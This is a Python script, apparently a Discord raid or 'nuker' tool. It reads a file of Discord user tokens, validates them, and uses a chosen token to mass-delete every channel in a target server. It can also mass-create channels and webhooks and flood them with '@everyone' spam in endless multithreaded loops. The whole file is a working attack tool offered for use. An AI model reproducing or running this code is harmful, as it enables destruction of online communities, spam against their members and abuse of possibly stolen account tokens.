import os
import requests
import threading
import time
import concurrent.futures

# Spam settings
SPAM_SETTINGS = {
    "spam_message": "@everyone Sowwy!!! :3",  # Message 2 spam
    "webhook_username": "GANEY",              # Username for the bot
    "webhook_avatar_url": "https://i.imgur.com/hx7cILs.jpeg", # PFP for the bot
    "message_delay": 0.01                     # Delay
}

# Constants
COOL_TITLE = "GANEY"
DISCORD_API_URL = "https://discord.com/api/v9"

# Set console title
os.system("title " + COOL_TITLE)


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_gradient(text, start_color=(255, 255, 255), mid_color=(0, 0, 255), end_color=(255, 255, 255)):
    start_r, start_g, start_b = start_color
    mid_r, mid_g, mid_b = mid_color
    end_r, end_g, end_b = end_color
    length = len(text)

    gradient_text = ""
    for i, char in enumerate(text):
        if i < length / 2:
            progress = i / (length / 2)
            r = int(start_r + (mid_r - start_r) * progress)
            g = int(start_g + (mid_g - start_g) * progress)
            b = int(start_b + (mid_b - start_b) * progress)
        else:
            progress = (i - length / 2) / (length / 2)
            r = int(mid_r + (end_r - mid_r) * progress)
            g = int(mid_g + (end_g - mid_g) * progress)
            b = int(mid_b + (end_b - mid_b) * progress)

        gradient_text += f"\033[38;2;{r};{g};{b}m{char}\033[0m"
    print(gradient_text)


def input_gradient(prompt):
    """
    Displays a gradient prompt for user input.
    """
    clear_screen()
    start_r, start_g, start_b = 255, 255, 255  # White
    mid_r, mid_g, mid_b = 0, 0, 255  # Dark Blue
    end_r, end_g, end_b = 255, 255, 255  # White
    length = len(prompt)

    gradient_prompt = ""
    for i, char in enumerate(prompt):
        if i < length / 2:
            progress = i / (length / 2)
            r = int(start_r + (mid_r - start_r) * progress)
            g = int(start_g + (mid_g - start_g) * progress)
            b = int(start_b + (mid_b - start_b) * progress)
        else:
            progress = (i - length / 2) / (length / 2)
            r = int(mid_r + (end_r - mid_r) * progress)
            g = int(mid_g + (end_g - mid_g) * progress)
            b = int(mid_b + (end_b - mid_b) * progress)

        gradient_prompt += f"\033[38;2;{r};{g};{b}m{char}\033[0m"
    return input(gradient_prompt)


def check_discord_user_token(token):
    url = f"{DISCORD_API_URL}/users/@me"
    headers = {"Authorization": token}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        user = response.json()
        return True, user["username"]
    else:
        return False, None


def get_server_id(token, server_name_or_id):
    if server_name_or_id.isdigit():
        print(f"Using provided server ID: {server_name_or_id}")
        return server_name_or_id
    else:
        url = f"{DISCORD_API_URL}/users/@me/guilds"
        headers = {"Authorization": token}
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            guilds = response.json()
            for guild in guilds:
                if guild['name'] == server_name_or_id:
                    print(f"Found Guild '{server_name_or_id}' with ID: {guild['id']}")
                    return guild['id']
            print(f"Guild '{server_name_or_id}' not found.")
        else:
            print("Failed to retrieve guilds.")
    return None


def delete_channel(token, channel_id):
    url = f"{DISCORD_API_URL}/channels/{channel_id}"
    headers = {"Authorization": token}
    response = requests.delete(url, headers=headers)
    if response.status_code == 204:
        print_gradient(f"Deleted channel ID: {channel_id}", start_color=(0, 255, 0), mid_color=(0, 128, 0), end_color=(0, 255, 0))  # Green gradient
    else:
        print_gradient(f"Failed to delete channel ID: {channel_id}", start_color=(255, 0, 0), mid_color=(128, 0, 0), end_color=(255, 0, 0))  # Red gradient


def create_channel(token, server_id, channel_type, channel_name):
    url = f"{DISCORD_API_URL}/guilds/{server_id}/channels"
    headers = {"Authorization": token, "Content-Type": "application/json"}
    data = {"name": channel_name, "type": 2 if channel_type == "vc" else 0}
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 201:
        channel = response.json()
        print_gradient(f"Created {channel_type} channel '{channel_name}' with ID: {channel['id']}", start_color=(0, 255, 0), mid_color=(0, 128, 0), end_color=(0, 255, 0))  # Green gradient
        return channel['id']
    else:
        print_gradient(f"Failed to create {channel_type} channel '{channel_name}'", start_color=(255, 0, 0), mid_color=(128, 0, 0), end_color=(255, 0, 0))  # Red gradient
        return None


def create_webhook(token, channel_id, webhook_name):
    url = f"{DISCORD_API_URL}/channels/{channel_id}/webhooks"
    headers = {"Authorization": token, "Content-Type": "application/json"}
    data = {"name": webhook_name}
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 200:
        webhook = response.json()
        print_gradient(f"Created webhook '{webhook_name}' for channel ID: {channel_id}", start_color=(0, 255, 0), mid_color=(0, 128, 0), end_color=(0, 255, 0))  # Green gradient
        return webhook['url']
    else:
        print_gradient(f"Failed to create webhook for channel ID: {channel_id}", start_color=(255, 0, 0), mid_color=(128, 0, 0), end_color=(255, 0, 0))  # Red gradient
        return None


def delete_all_channels(token, server_id):
    url = f"{DISCORD_API_URL}/guilds/{server_id}/channels"
    headers = {"Authorization": token}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        channels = response.json()
        print_gradient("Retrieved all channels. Starting deletion process...", start_color=(0, 255, 0), mid_color=(0, 128, 0), end_color=(0, 255, 0))  # Green gradient
        with concurrent.futures.ThreadPoolExecutor(max_workers=5000) as executor:
            futures = [executor.submit(delete_channel, token, channel['id']) for channel in channels]
            for future in concurrent.futures.as_completed(futures):
                future.result()
        print_gradient("Done. Create new channels? (yes/no): ", start_color=(255, 255, 255), mid_color=(0, 0, 255), end_color=(255, 255, 255))
        create_option = input_gradient("").lower() == 'yes'
        if create_option:
            create_channels_flow(token, server_id)
    else:
        print_gradient("Failed to retrieve channels", start_color=(255, 0, 0), mid_color=(128, 0, 0), end_color=(255, 0, 0))  # Red gradient


def spam_webhook(url):
    payload = {
        "content": SPAM_SETTINGS["spam_message"],
        "username": SPAM_SETTINGS["webhook_username"],
        "avatar_url": SPAM_SETTINGS["webhook_avatar_url"]
    }
    while True:
        response = requests.post(url, json=payload)
        time.sleep(SPAM_SETTINGS["message_delay"])


def spam_webhooks(webhook_urls):
    with concurrent.futures.ThreadPoolExecutor(max_workers=5000) as executor:
        futures = [executor.submit(spam_webhook, url) for url in webhook_urls]
        for future in concurrent.futures.as_completed(futures):
            future.result()


def create_channels_flow(token, server_id):
    channel_type = input_gradient("Channel type ('text' or 'vc')   ~   ")
    channel_name = input_gradient("Channel name   ~   ")
    amount = int(input_gradient("Number of channels to create   ~   "))
    create_webhooks = input_gradient("Create webhooks for the new channels? (yes/no)   ~   ").lower() == 'yes'
    send_messages_option = input_gradient("Send messages to the webhooks? (yes/no)   ~   ").lower() == 'yes'
    webhook_name = input_gradient("Webhook name   ~   ") if create_webhooks else None
    message = input_gradient("Message to send   ~   ") if send_messages_option else None

    channel_ids = []
    webhook_urls = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=5000) as executor:
        futures = [executor.submit(create_channel, token, server_id, channel_type, channel_name) for _ in range(amount)]
        for future in concurrent.futures.as_completed(futures):
            channel_id = future.result()
            if channel_id and create_webhooks:
                webhook_url = create_webhook(token, channel_id, webhook_name)
                if webhook_url:
                    webhook_urls.append(webhook_url)
    if send_messages_option:
        spam_webhooks(webhook_urls)


clear_screen()

with open("TXTS/validtokens.txt", "r") as file:
    tokens = list(set(file.read().splitlines()))  

usernames = []
valid_tokens = []
for token in tokens:
    valid, username = check_discord_user_token(token)
    if valid:
        usernames.append(username)
        valid_tokens.append(token)
    else:
        usernames.append("Invalid Token")

selected_username = input_gradient("Token Name: ")

selected_token = None
for i, username in enumerate(usernames):
    if username == selected_username:
        selected_token = valid_tokens[i]
        break

if selected_token is None:
    print_gradient("Invalid username selected.", start_color=(255, 0, 0), mid_color=(128, 0, 0), end_color=(255, 0, 0))  # Red gradient
    exit()

server_name_or_id = input_gradient("Guild Name Or Guild ID   ~   ")

if check_discord_user_token(selected_token)[0]:
    server_id = get_server_id(selected_token, server_name_or_id)
    if server_id:
        action = input_gradient("Would you like to 'create' or 'delete' channels?   ~   ").lower()
        if action == "create":
            create_channels_flow(selected_token, server_id)
        elif action == "delete":
            delete_all_channels(selected_token, server_id)
        else:
            print_gradient("Invalid action", start_color=(255, 0, 0), mid_color=(128, 0, 0), end_color=(255, 0, 0))  # Red gradient
    else:
        print_gradient(f"Guild '{server_name_or_id}' not found.", start_color=(255, 0, 0), mid_color=(128, 0, 0), end_color=(255, 0, 0))  # Red gradient
else:
    print_gradient("The user token is invalid.", start_color=(255, 0, 0), mid_color=(128, 0, 0), end_color=(255, 0, 0))  # Red gradient
